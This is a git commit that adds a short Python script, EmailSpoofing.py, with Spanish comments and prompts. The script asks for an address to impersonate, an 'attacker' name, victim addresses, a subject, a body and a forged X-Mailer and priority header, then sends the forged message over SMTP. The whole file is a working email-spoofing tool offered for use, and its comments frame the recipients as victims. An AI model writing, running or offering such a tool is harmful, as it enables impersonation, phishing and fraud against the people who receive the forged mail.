58e8770d3dba5e4c2bb651181ed4770b22f70a99
Alejandro Vera <55401513+xXaVeRaXx@users.noreply.github.com>
2022-06-22 20:20:27 +0200

    Add files via upload

---
+++ EmailSpoofing.py
@@ -0,0 +1,65 @@
+# Import smtplib for the actual sending function
+import smtplib
+
+# Import the email modules
+from email.message import Message
+
+def prompt(prompt):
+    return input(prompt).strip()
+
+#Email a simular
+email = input("Introduce un email que quiera simular: ")
+print()
+
+#Nombre de atacante
+atacante = input("Introduce el nombre del atacante: ")
+print()
+
+#Víctima a atacar
+victima = prompt("Introduce una víctima a quién enviarle un email: ").split()
+print()
+
+#Tema
+subject = input("Introduce un asunto: ")
+print()
+
+#Texto
+text = input("Introduce un texto: ")
+print()
+
+#Prioridad email
+print("Puedes escoger entre las siguientes prioridades:")
+print("1. Muy alta")
+print("2. Media alta")
+print("3. Media")
+print("4. Media baja")
+print("5. Muy baja")
+prioridad = input("Introduce un número de la prioridad que desea que tenga el e-mail: ")
+print()
+
+#X-Mailer email
+print("Puedes escoger diferentes X-Mailers, donde indicas de qué tipo de servidor proviene el email.")
+print("Ejemplos de X-Mailer: Apple Mail, ColdFusion MX Application Server, E-Messenger, iPhone Mail, KMail, Lotus Notes, Microsoft Office Outlook, Microsoft Outlook Express, Microsoft Outlook IMO, Microsoft Windows Live Mail, Microsoft Windows Mail, Mozilla Thunderbird, Mozilla/5.0, Novell GroupWise, Novell GroupWise Internet Agent, PHP, PHPMailer, QUALCOMM Windows Eudora Version, The Bat!, Unknown (No Version), YahooMailWebService y Zimbra")
+print("También puede inventarse uno a su elección, no necesariamente tiene que estar en la lista.")
+XMAILER = input("Introduce un X-Mailer que desea que tenga el e-mail: ")
+
+#Inicia el servidor para enviar el email
+server = smtplib.SMTP('localhost')
+server.set_debuglevel(1)
+server.ehlo()
+server.starttls()
+
+#Crea email con las indicaciones que le haya dado el usuario
+m = Message()
+m['From'] = "{}".format(atacante) + " <{}>".format(email)
+m['To'] = ', '.join(victima)
+m['X-Priority'] = prioridad
+m['X-Mailer'] = XMAILER
+m['Subject'] = subject
+m.set_payload(text)
+
+#Envía el email
+server.sendmail(email, victima, m.as_string())
+
+#Cierra el servidor de correo
+server.quit()
